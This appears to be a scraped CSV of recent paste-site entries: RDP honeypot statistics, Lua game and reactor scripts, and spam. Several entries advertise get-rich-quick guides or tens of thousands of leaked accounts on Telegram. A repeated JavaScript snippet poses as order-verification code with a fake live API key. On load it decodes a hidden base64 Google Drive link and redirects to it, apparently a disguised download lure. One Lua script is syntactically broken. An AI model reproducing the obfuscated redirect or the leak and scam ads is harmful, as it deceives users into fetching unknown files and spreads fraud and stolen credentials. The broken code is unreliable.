id,title,username,language,date,content
RWLEfmMr,2025-04-23_stats.json,rdp_snitch,JSON,Wednesday 23rd of April 2025 07:18:28 PM CDT,"{
  ""ip"": {
    ""159.89.6.147"": 1086,
    ""211.185.207.14"": 33,
    ""152.230.66.217"": 924,
    ""80.94.95.198"": 30,
    ""71.82.170.60"": 51,
    ""205.210.31.102"": 9,
    ""167.94.145.100"": 3,
    ""185.196.220.41"": 9,
    ""193.142.146.227"": 9,
    ""80.94.95.90"": 12,
    ""88.214.50.50"": 9,
    ""185.147.124.177"": 9,
    ""167.71.75.52"": 15,
    ""194.165.16.164"": 6,
    ""91.238.181.94"": 6,
    ""205.210.31.234"": 9,
    ""68.183.178.139"": 30,
    ""199.45.154.140"": 3,
    ""147.182.136.64"": 459,
    ""193.176.22.13"": 12,
    ""167.94.146.59"": 3,
    ""147.185.132.22"": 9,
    ""152.32.235.96"": 3,
    ""173.225.111.171"": 6,
    ""156.227.234.181"": 9,
    ""185.147.124.105"": 9,
    ""178.20.129.235"": 3,
    ""147.185.132.42"": 9,
    ""82.202.249.174"": 3
  },
  ""asn"": {
    ""AS14061"": 1590,
    ""AS4766"": 33,
    ""AS14259"": 924,
    ""AS204428"": 42,
    ""AS20115"": 51,
    ""AS396982"": 36,
    ""AS398705"": 6,
    ""AS208046"": 9,
    ""AS213438"": 9,
    ""Unknown"": 21,
    ""AS49505"": 21,
    ""AS48721"": 6,
    ""AS49434"": 6,
    ""AS398722"": 3,
    ""AS135377"": 3,
    ""AS19318"": 6,
    ""AS138152"": 9,
    ""AS24810"": 3
  },
  ""isp"": {
    ""DigitalOcean, LLC"": 1590,
    ""Korea Telecom"": 33,
    ""Gtd Internet S.A."": 924,
    ""SS-Net"": 42,
    ""Charter Communications"": 51,
    ""Google LLC"": 36,
    ""Censys, Inc."": 9,
    ""ColocationX Ltd."": 9,
    ""ColocaTel Inc."": 9,
    ""SIA \""Singularity Telecom\"""": 21,
    ""JSC Selectel"": 21,
    ""Flyservers S.A."": 6,
    ""Datacenter location PAR1 France"": 6,
    ""UCLOUD INFORMATION TECHNOLOGY (HK) LIMITED"": 3,
    ""Interserver, Inc"": 6,
    ""Yisu Cloud Ltd"": 9,
    ""Teleset LLC Nchelny Branch"": 3
  },
  ""org"": {
    ""DigitalOcean, LLC"": 1590,
    ""Kornet"": 33,
    ""Gtd Internet S.A"": 924,
    ""Unmanaged LTD"": 42,
    ""Spectrum"": 51,
    ""Palo Alto Networks, Inc"": 36,
    ""Censys, Inc."": 9,
    ""ColocationX Ltd"": 9,
    ""ColocaTel Inc"": 9,
    ""SIA \""Singularity Telecom\"""": 21,
    ""Tilda LLC"": 18,
    ""Flyservers S.A"": 6,
    ""ThinkTech Technology Industrial CO. Limited"": 6,
    ""Ucloud Information Technology"": 3,
    ""Interserver, Inc"": 6,
    ""Yisu Cloud Ltd"": 9,
    ""Teleset LLC"": 3,
    ""Unknown"": 3
  },
  ""regionName"": {
    ""Hesse"": 1089,
    ""Sejong-si"": 33,
    ""Santiago Metropolitan"": 924,
    ""Budapest"": 42,
    ""Wisconsin"": 51,
    ""California"": 39,
    ""Michigan"": 3,
    ""Virginia"": 9,
    ""North Holland"": 24,
    ""New York"": 24,
    ""Moscow"": 18,
    ""Kaunas"": 6,
    ""\u00cele-de-France"": 6,
    ""South West"": 30,
    ""New Jersey"": 465,
    ""\u014csaka"": 9,
    ""Tatarstan Republic"": 3,
    ""St.-Petersburg"": 3
  },
  ""country"": {
    ""Germany"": 1089,
    ""South Korea"": 33,
    ""Chile"": 924,
    ""Hungary"": 42,
    ""United States"": 591,
    ""The Netherlands"": 24,
    ""Russia"": 24,
    ""Lithuania"": 6,
    ""France"": 6,
    ""Singapore"": 30,
    ""Japan"": 9
  },
  ""account"": {
    ""hello"": 2526,
    ""142.93.8.59"": 114,
    ""HSNhxaEnO"": 3,
    ""LkpFps"": 3,
    ""cFmcYP"": 3,
    ""(empty)"": 12,
    ""Domain"": 51,
    ""Administr"": 12,
    ""Test"": 24,
    ""MuBjAvGDV"": 3,
    ""HEsPli"": 3,
    ""qTvxXq"": 3,
    ""fHPVkyaUJ"": 3,
    ""ueEvWq"": 3,
    ""RPHwuE"": 3,
    ""Administrator"": 3,
    ""AAgIIYtnh"": 3,
    ""orqriV"": 3,
    ""wuDrbC"": 3
  },
  ""keyboard"": {
    ""Unknown"": 2778
  },
  ""client_build"": {
    ""Unknown"": 2778
  },
  ""client_name"": {
    ""Unknown"": 2778
  },
  ""ip_type"": {
    ""hosting"": 1632,
    ""Unknown"": 1116,
    ""hosting & proxy"": 30
  }
}"
t69bSuEd,Make $1000 15-MINUTES  (BEGINNER) KB,RickyplaylotTutorial,JavaScript,Wednesday 23rd of April 2025 07:16:41 PM CDT," 
Pdf https://tinyurl.com/privguidee


onenALEGVr
"
mjUz6N8i,2025-04-23_stats.json,rdp_snitch,JSON,Wednesday 23rd of April 2025 07:16:18 PM CDT,"{
  ""ip"": {
    ""159.89.6.147"": 724,
    ""211.185.207.14"": 22,
    ""152.230.66.217"": 616,
    ""80.94.95.198"": 20,
    ""71.82.170.60"": 34,
    ""205.210.31.102"": 6,
    ""167.94.145.100"": 2,
    ""185.196.220.41"": 6,
    ""193.142.146.227"": 6,
    ""80.94.95.90"": 8,
    ""88.214.50.50"": 6,
    ""185.147.124.177"": 6,
    ""167.71.75.52"": 10,
    ""194.165.16.164"": 4,
    ""91.238.181.94"": 4,
    ""205.210.31.234"": 6,
    ""68.183.178.139"": 20,
    ""199.45.154.140"": 2,
    ""147.182.136.64"": 306,
    ""193.176.22.13"": 8,
    ""167.94.146.59"": 2,
    ""147.185.132.22"": 6,
    ""152.32.235.96"": 2,
    ""173.225.111.171"": 4,
    ""156.227.234.181"": 6,
    ""185.147.124.105"": 6,
    ""178.20.129.235"": 2,
    ""147.185.132.42"": 6,
    ""82.202.249.174"": 2
  },
  ""asn"": {
    ""AS14061"": 1060,
    ""AS4766"": 22,
    ""AS14259"": 616,
    ""AS204428"": 28,
    ""AS20115"": 34,
    ""AS396982"": 24,
    ""AS398705"": 4,
    ""AS208046"": 6,
    ""AS213438"": 6,
    ""Unknown"": 14,
    ""AS49505"": 14,
    ""AS48721"": 4,
    ""AS49434"": 4,
    ""AS398722"": 2,
    ""AS135377"": 2,
    ""AS19318"": 4,
    ""AS138152"": 6,
    ""AS24810"": 2
  },
  ""isp"": {
    ""DigitalOcean, LLC"": 1060,
    ""Korea Telecom"": 22,
    ""Gtd Internet S.A."": 616,
    ""SS-Net"": 28,
    ""Charter Communications"": 34,
    ""Google LLC"": 24,
    ""Censys, Inc."": 6,
    ""ColocationX Ltd."": 6,
    ""ColocaTel Inc."": 6,
    ""SIA \""Singularity Telecom\"""": 14,
    ""JSC Selectel"": 14,
    ""Flyservers S.A."": 4,
    ""Datacenter location PAR1 France"": 4,
    ""UCLOUD INFORMATION TECHNOLOGY (HK) LIMITED"": 2,
    ""Interserver, Inc"": 4,
    ""Yisu Cloud Ltd"": 6,
    ""Teleset LLC Nchelny Branch"": 2
  },
  ""org"": {
    ""DigitalOcean, LLC"": 1060,
    ""Kornet"": 22,
    ""Gtd Internet S.A"": 616,
    ""Unmanaged LTD"": 28,
    ""Spectrum"": 34,
    ""Palo Alto Networks, Inc"": 24,
    ""Censys, Inc."": 6,
    ""ColocationX Ltd"": 6,
    ""ColocaTel Inc"": 6,
    ""SIA \""Singularity Telecom\"""": 14,
    ""Tilda LLC"": 12,
    ""Flyservers S.A"": 4,
    ""ThinkTech Technology Industrial CO. Limited"": 4,
    ""Ucloud Information Technology"": 2,
    ""Interserver, Inc"": 4,
    ""Yisu Cloud Ltd"": 6,
    ""Teleset LLC"": 2,
    ""Unknown"": 2
  },
  ""regionName"": {
    ""Hesse"": 726,
    ""Sejong-si"": 22,
    ""Santiago Metropolitan"": 616,
    ""Budapest"": 28,
    ""Wisconsin"": 34,
    ""California"": 26,
    ""Michigan"": 2,
    ""Virginia"": 6,
    ""North Holland"": 16,
    ""New York"": 16,
    ""Moscow"": 12,
    ""Kaunas"": 4,
    ""\u00cele-de-France"": 4,
    ""South West"": 20,
    ""New Jersey"": 310,
    ""\u014csaka"": 6,
    ""Tatarstan Republic"": 2,
    ""St.-Petersburg"": 2
  },
  ""country"": {
    ""Germany"": 726,
    ""South Korea"": 22,
    ""Chile"": 616,
    ""Hungary"": 28,
    ""United States"": 394,
    ""The Netherlands"": 16,
    ""Russia"": 16,
    ""Lithuania"": 4,
    ""France"": 4,
    ""Singapore"": 20,
    ""Japan"": 6
  },
  ""account"": {
    ""hello"": 1684,
    ""142.93.8.59"": 76,
    ""HSNhxaEnO"": 2,
    ""LkpFps"": 2,
    ""cFmcYP"": 2,
    ""(empty)"": 8,
    ""Domain"": 34,
    ""Administr"": 8,
    ""Test"": 16,
    ""MuBjAvGDV"": 2,
    ""HEsPli"": 2,
    ""qTvxXq"": 2,
    ""fHPVkyaUJ"": 2,
    ""ueEvWq"": 2,
    ""RPHwuE"": 2,
    ""Administrator"": 2,
    ""AAgIIYtnh"": 2,
    ""orqriV"": 2,
    ""wuDrbC"": 2
  },
  ""keyboard"": {
    ""Unknown"": 1852
  },
  ""client_build"": {
    ""Unknown"": 1852
  },
  ""client_name"": {
    ""Unknown"": 1852
  },
  ""ip_type"": {
    ""hosting"": 1088,
    ""Unknown"": 744,
    ""hosting & proxy"": 20
  }
}"
RKw8UQVb,2025-04-23_stats.json,rdp_snitch,JSON,Wednesday 23rd of April 2025 07:15:09 PM CDT,"{
  ""ip"": {
    ""159.89.6.147"": 362,
    ""211.185.207.14"": 11,
    ""152.230.66.217"": 308,
    ""80.94.95.198"": 10,
    ""71.82.170.60"": 17,
    ""205.210.31.102"": 3,
    ""167.94.145.100"": 1,
    ""185.196.220.41"": 3,
    ""193.142.146.227"": 3,
    ""80.94.95.90"": 4,
    ""88.214.50.50"": 3,
    ""185.147.124.177"": 3,
    ""167.71.75.52"": 5,
    ""194.165.16.164"": 2,
    ""91.238.181.94"": 2,
    ""205.210.31.234"": 3,
    ""68.183.178.139"": 10,
    ""199.45.154.140"": 1,
    ""147.182.136.64"": 153,
    ""193.176.22.13"": 4,
    ""167.94.146.59"": 1,
    ""147.185.132.22"": 3,
    ""152.32.235.96"": 1,
    ""173.225.111.171"": 2,
    ""156.227.234.181"": 3,
    ""185.147.124.105"": 3,
    ""178.20.129.235"": 1,
    ""147.185.132.42"": 3,
    ""82.202.249.174"": 1
  },
  ""asn"": {
    ""AS14061"": 530,
    ""AS4766"": 11,
    ""AS14259"": 308,
    ""AS204428"": 14,
    ""AS20115"": 17,
    ""AS396982"": 12,
    ""AS398705"": 2,
    ""AS208046"": 3,
    ""AS213438"": 3,
    ""Unknown"": 7,
    ""AS49505"": 7,
    ""AS48721"": 2,
    ""AS49434"": 2,
    ""AS398722"": 1,
    ""AS135377"": 1,
    ""AS19318"": 2,
    ""AS138152"": 3,
    ""AS24810"": 1
  },
  ""isp"": {
    ""DigitalOcean, LLC"": 530,
    ""Korea Telecom"": 11,
    ""Gtd Internet S.A."": 308,
    ""SS-Net"": 14,
    ""Charter Communications"": 17,
    ""Google LLC"": 12,
    ""Censys, Inc."": 3,
    ""ColocationX Ltd."": 3,
    ""ColocaTel Inc."": 3,
    ""SIA \""Singularity Telecom\"""": 7,
    ""JSC Selectel"": 7,
    ""Flyservers S.A."": 2,
    ""Datacenter location PAR1 France"": 2,
    ""UCLOUD INFORMATION TECHNOLOGY (HK) LIMITED"": 1,
    ""Interserver, Inc"": 2,
    ""Yisu Cloud Ltd"": 3,
    ""Teleset LLC Nchelny Branch"": 1
  },
  ""org"": {
    ""DigitalOcean, LLC"": 530,
    ""Kornet"": 11,
    ""Gtd Internet S.A"": 308,
    ""Unmanaged LTD"": 14,
    ""Spectrum"": 17,
    ""Palo Alto Networks, Inc"": 12,
    ""Censys, Inc."": 3,
    ""ColocationX Ltd"": 3,
    ""ColocaTel Inc"": 3,
    ""SIA \""Singularity Telecom\"""": 7,
    ""Tilda LLC"": 6,
    ""Flyservers S.A"": 2,
    ""ThinkTech Technology Industrial CO. Limited"": 2,
    ""Ucloud Information Technology"": 1,
    ""Interserver, Inc"": 2,
    ""Yisu Cloud Ltd"": 3,
    ""Teleset LLC"": 1,
    ""Unknown"": 1
  },
  ""regionName"": {
    ""Hesse"": 363,
    ""Sejong-si"": 11,
    ""Santiago Metropolitan"": 308,
    ""Budapest"": 14,
    ""Wisconsin"": 17,
    ""California"": 13,
    ""Michigan"": 1,
    ""Virginia"": 3,
    ""North Holland"": 8,
    ""New York"": 8,
    ""Moscow"": 6,
    ""Kaunas"": 2,
    ""\u00cele-de-France"": 2,
    ""South West"": 10,
    ""New Jersey"": 155,
    ""\u014csaka"": 3,
    ""Tatarstan Republic"": 1,
    ""St.-Petersburg"": 1
  },
  ""country"": {
    ""Germany"": 363,
    ""South Korea"": 11,
    ""Chile"": 308,
    ""Hungary"": 14,
    ""United States"": 197,
    ""The Netherlands"": 8,
    ""Russia"": 8,
    ""Lithuania"": 2,
    ""France"": 2,
    ""Singapore"": 10,
    ""Japan"": 3
  },
  ""account"": {
    ""hello"": 842,
    ""142.93.8.59"": 38,
    ""HSNhxaEnO"": 1,
    ""LkpFps"": 1,
    ""cFmcYP"": 1,
    ""(empty)"": 4,
    ""Domain"": 17,
    ""Administr"": 4,
    ""Test"": 8,
    ""MuBjAvGDV"": 1,
    ""HEsPli"": 1,
    ""qTvxXq"": 1,
    ""fHPVkyaUJ"": 1,
    ""ueEvWq"": 1,
    ""RPHwuE"": 1,
    ""Administrator"": 1,
    ""AAgIIYtnh"": 1,
    ""orqriV"": 1,
    ""wuDrbC"": 1
  },
  ""keyboard"": {
    ""Unknown"": 926
  },
  ""client_build"": {
    ""Unknown"": 926
  },
  ""client_name"": {
    ""Unknown"": 926
  },
  ""ip_type"": {
    ""hosting"": 544,
    ""Unknown"": 372,
    ""hosting & proxy"": 10
  }
}"
7MiUJnvt,Products.js,x2LeaF,JavaScript,Wednesday 23rd of April 2025 07:09:46 PM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/40691/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
69SsrgL7,EARN $900 INSTANTLY 2025 TA,RickyplaylotTutorial,JavaScript,Wednesday 23rd of April 2025 07:07:24 PM CDT," 
Pdf https://tinyurl.com/privguidee


xKw5OPlr0V
"
XNJt6zvc,Make $1000 15-MINUTES (BEGINNER) 14,RickyplaylotTutorial,JavaScript,Wednesday 23rd of April 2025 06:58:09 PM CDT," 
Pdf https://tinyurl.com/privguidee


qTdgkev8xj
"
GsY07sWX,Leaked Accounts - Fresh Hits,dentira,JavaScript,Wednesday 23rd of April 2025 06:54:23 PM CDT,54680 Accounts Posted On https://t.me/leakedbyeminem
ZcYXzJcN,Order.js,x2LeaF,JavaScript,Wednesday 23rd of April 2025 06:53:56 PM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/93614/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
byrQZ1xr,ItemDumper,Lynsis,Lua,Wednesday 23rd of April 2025 06:52:17 PM CDT,"function dumpItem(item)
    if not item then
        print(""Item is nil, exiting function."")
        return
    end

    -- Check if the provided item is a container
    if item.InventoryOwner or getName(item) == ""Traveler's Chest"" then
        print(""Item is a container, exiting function."")
        return
    end

    -- Define a key table for matching StatsId to folder names
    local statsIdToFolder = {
        LOOT = ""Loot"",
        TOOL = ""Tools"",
        FOOD = ""Food"",
        Key = ""Keys"",
        Scroll = ""Scrolls"",
        Arrow = ""Arrows"",
        Ingredient = ""Ingredients"",
        Herbs = ""Ingredients"",
        BOOK = ""Books""
    }

    -- Define a table for mapping specific folder names to more general categories
    local folderMapping = {
        Body = ""Clothing"",
        Breast = ""Clothing"",
        Ring = ""Rings"",
        Grenade = ""Grenades"",
        Potion = ""Potions"",
        Scroll = ""Scrolls"",
        Amulet = ""Amulets"",
        Footwear = ""Boots"",
        Helmet = ""Helmets"",
        Cloak = ""Cloaks""
    }

    -- Define a table for armor types that should be grouped under ""Armor""
    local armorTypes = {
        Helmets = true,
        Clothing = true,
        LightArmor = true,
        MediumArmor = true,
        HeavyArmor = true,
        Boots = true,
        Cloaks = true,
        Rings = true,
        Amulets = true,
        Gloves = true,
        Shields = true
    }

    local campClothes = {
        VanityBody = true,
        VanityBoots = true,
        Underwear = true
    }

    print(""Dumping "".. getName(item))
    
    -- Get the ProficiencyGroup component if it exists
    local proficiencyGroup = item:GetComponent(""ProficiencyGroup"")
    local proficiencyFlags

    if proficiencyGroup then
        proficiencyFlags = proficiencyGroup.Flags
        --print(""ProficiencyGroup found. Flags: "" .. tostring(proficiencyFlags))
    else
        --print(""No ProficiencyGroup found."")
    end

    -- Determine folder1 and folder2 based on the flags
    local folder1, folder2

    if proficiencyFlags then
        --print(""Checking proficiency flags for folder1..."")
        for _, flag in ipairs(proficiencyFlags) do
            --print(""Checking proficiency flag: "" .. flag)
            if flag == ""MartialWeapons"" or flag == ""SimpleWeapons"" then
                folder1 = flag
                --print(""Folder1 set by proficiency flag: "" .. folder1)
                break
            end
        end

        if not folder1 and #proficiencyFlags > 0 then
            folder1 = proficiencyFlags[1]
            --print(""Folder1 not set; using the first proficiency flag: "" .. folder1)
        end

        if folder1 then
            for _, flag in ipairs(proficiencyFlags) do
                if flag ~= folder1 then
                    folder2 = flag
                    --print(""Folder2 set by proficiency flag: "" .. folder2)
                    break
                end
            end
        end
    end

    if not folder1 then
        local slot = item.Equipable and item.Equipable.Slot
        if slot then
            folder1 = slot
        end
    end

    -- Check other sources if folder1 was not set by proficiency flags
    if not folder1 then
        -- Check if statsId matches any keyword in statsIdToFolder
        local statsId = item.Data and item.Data.StatsId
        if statsId then
            --print(""Checking statsId for matches: "" .. statsId)
            for key in pairs(statsIdToFolder) do
                if statsId:match(key) then
                    folder1 = statsIdToFolder[key]
                    --print(""Folder1 set from statsId match with keyword: "" .. key)
                    break
                end
            end
    
            if not folder1 then
                --print(""No match found in statsId."")
            end
        else
            --print(""StatsId is nil."")
        end
    
        -- Check icon for matches if folder1 is still not set
        if not folder1 then
            local icon = item.GameObjectVisual and item.GameObjectVisual.Icon
            if icon then
                --print(""Checking icon for matches: "" .. icon)
                for key in pairs(statsIdToFolder) do
                    if icon:match(key) then
                        folder1 = statsIdToFolder[key]
                        --print(""Folder1 set from icon match with keyword: "" .. key)
                        break
                    end
                end
    
                if not folder1 then
                    --print(""No match found in icon."")
                end
            else
                --print(""Icon is nil or not found."")
            end
        end
    end
    
    if not folder1 then
        local usetype = item.Use and item.Use.ItemUseType
        if usetype then
            folder1 = usetype
        end
    end

    -- Set folder1 to ""Uncategorized"" only if it hasn't been set by now
    if not folder1 then
        folder1 = ""Uncategorized""
        --print(""Folder1 not set by any sources; using 'Uncategorized'."")
    end

    -- Check and apply folder mapping for specific cases
    if folderMapping[folder1] then
        --print(""Folder1 matched in folderMapping. Changing folder1 to: "" .. folderMapping[folder1])
        folder1 = folderMapping[folder1]
    end

    -- Check if folder1 should be grouped under ""Armor""
    if armorTypes[folder1] then
        --print(""Folder1 is an armor type. Grouping under 'Armor'."")
        folder2 = folder1
        folder1 = ""Armor""
    end

    if campClothes[folder1] then
        folder2 = folder1
        folder1 = ""Camp Clothes""
    end

    folder1 = tostring(folder1)
    if folder2 then
        folder2 = tostring(folder2)
    end

    -- Create the folder path
    local path = ""/ItemDumps/"" .. folder1
    if folder2 and folder2 ~= ""Uncategorized"" then
        path = path .. ""/"" .. folder2
    end
    --print(""Folder path created: "" .. path)
    local Uuid = tostring(item.Uuid.EntityUuid)
    -- Save the item to the corresponding folder
    local itemName = getName(item) or ""UnknownItem""
    --print(""Saving item to path: "" .. path .. ""/"" .. itemName .. "" - "".. Uuid .."".json"")
    Ext.IO.SaveFile(path .. ""/"" .. itemName .. "" - "".. Uuid .."".json"", Ext.DumpExport(item:GetAllComponents()))
end"
cCj8zSTx,EARN $900 INSTANTLY 2025⭐ WF,RickyplaylotTutorial,JavaScript,Wednesday 23rd of April 2025 06:48:53 PM CDT," 
Pdf https://tinyurl.com/privguidee


jksnwueyim
"
by4HFiWM,Gray Sky,PuzzlingExploits1,Lua,Wednesday 23rd of April 2025 06:43:59 PM CDT,"Local sky = Instance.new(""Sky"")
sky.Parent = game.Lighting
--Set properties for a gray sky 
sky.SkyboxBk = """"
sky.SkyboxDn = """"
sky.SkyboxFt = """"
ssky.SkyboxLf = """"
ssky.SkyboxRt = """"
ssky.SkyboxUp = """"
sky.CelestialBodiesShown =false

-- Adjust Lighting settings for a gray atmosphere 
game.Lighting.Ambient = Color.new(0.5, O.5, 0.5,)-- Gray tone
game.Lighting.OutdoorAmbient = Color3.new(0.5, 0.5, 0.5)
game.Lighting.Brightness = 2
game.Lighning.FogColor = Color3.new (0.5, 0.5, 0.5)
game.Lightning.FogEnd = 1000"
igciJcU3,Make $1000 15-MINUTES  (BEGINNER) KB,RickyplaylotTutorial,JavaScript,Wednesday 23rd of April 2025 06:39:38 PM CDT," 
Pdf https://tinyurl.com/privguidee


36ACgZbcDV
"
7C73mAPg,Chaturbate with Tokens,dentira,JavaScript,Wednesday 23rd of April 2025 06:39:00 PM CDT,60953 Accounts Posted On https://t.me/leakedbyeminem
sxy02j5W,Market.js,x2LeaF,JavaScript,Wednesday 23rd of April 2025 06:38:32 PM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/70073/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
mPB8nKRd,EARN $900 INSTANTLY 2025 TA,RickyplaylotTutorial,JavaScript,Wednesday 23rd of April 2025 06:30:23 PM CDT," 
Pdf https://tinyurl.com/privguidee


YrNGM4fgjn
"
uJS22WYw,Crypto Accounts,dentira,JavaScript,Wednesday 23rd of April 2025 06:23:38 PM CDT,92587 Accounts Posted On https://t.me/leakedbyeminem
xdTiJGVW,Untitled,x2LeaF,JavaScript,Wednesday 23rd of April 2025 06:23:10 PM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/43702/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
bqKDAKGe,Reactor Controller,emulackle,Lua,Wednesday 23rd of April 2025 06:16:11 PM CDT,"local version = ""0.62""
local tag = ""reactorConfig""
--[[
Program made by DrunkenKas
	See github: https://github.com/Kasra-G/ReactorController/#readme

The MIT License (MIT)
 
Copyright (c) 2021 Kasra Ghaffari

Permission is hereby granted, free of charge, to any person obtaining a copy
of this software and associated documentation files (the ""Software""), to deal
in the Software without restriction, including without limitation the rights
to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
copies of the Software, and to permit persons to whom the Software is
furnished to do so, subject to the following conditions:
 
The above copyright notice and this permission notice shall be included in
all copies or substantial portions of the Software.
 
THE SOFTWARE IS PROVIDED ""AS IS"", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN
THE SOFTWARE.
]]

dofile(""/usr/apis/touchpoint.lua"")

local reactorVersion, reactor
local mon, monSide
local sizex, sizey, dim, oo, offy
local btnOn, btnOff, invalidDim
local minb, maxb
local rod, rfLost
local storedLastTick, storedThisTick, lastRFT = 0,0,0
local fuelTemp, caseTemp, fuelUsage, waste, capacity = 0,0,0,0,1
local t
local displayingGraphMenu = false

local secondsToAverage = 2

local averageStoredThisTick = 0
local averageLastRFT = 0
local averageRod = 0
local averageFuelUsage = 0
local averageWaste = 0
local averageFuelTemp = 0
local averageCaseTemp = 0
local averageRfLost = 0

-- table of which graphs to draw
local graphsToDraw = {}

-- table of all the graphs
local graphs =
{
    ""Energy Buffer"",
    ""Control Level"",
    ""Temperatures"",
}

-- marks the offsets for each graph position
-- { XOffset, <is_available> }
local XOffs =
{
    { 4, true},
    {27, true},
    {50, true},
    {73, true},
    {96, true},
}

-- Draw a box with no fill
local function drawBox(size, xoff, yoff, color)
    if (monSide == nil) then
        return
    end
    local x,y = mon.getCursorPos()
    mon.setBackgroundColor(color)
    local horizLine = string.rep("" "", size[1])
    mon.setCursorPos(xoff + 1, yoff + 1)
    mon.write(horizLine)
    mon.setCursorPos(xoff + 1, yoff + size[2])
    mon.write(horizLine)

    -- Draw vertical lines
    for i=0, size[2] - 1 do
        mon.setCursorPos(xoff + 1, yoff + i + 1)
        mon.write("" "")
        mon.setCursorPos(xoff + size[1], yoff + i +1)
        mon.write("" "")
    end
    mon.setCursorPos(x,y)
    mon.setBackgroundColor(colors.black)
end

--Draw a filled box
local function drawFilledBox(size, xoff, yoff, colorOut, colorIn)
    if (monSide == nil) then
        return
    end
    local horizLine = string.rep("" "", size[1] - 2)
    drawBox(size, xoff, yoff, colorOut)
    local x,y = mon.getCursorPos()
    mon.setBackgroundColor(colorIn)
    for i=2, size[2] - 1 do
        mon.setCursorPos(xoff + 2, yoff + i)
        mon.write(horizLine)
    end
    mon.setBackgroundColor(colors.black)
    mon.setCursorPos(x,y)
end

--Draws text on the screen
local function drawText(text, x1, y1, backColor, textColor)
    if (monSide == nil) then
        return
    end
    local x, y = mon.getCursorPos()
    mon.setCursorPos(x1, y1)
    mon.setBackgroundColor(backColor)
    mon.setTextColor(textColor)
    mon.write(text)
    mon.setTextColor(colors.white)
    mon.setBackgroundColor(colors.black)
    mon.setCursorPos(x,y)
end

--Helper method for adding buttons
local function addButt(name, callBack, size, xoff, yoff, color1, color2)
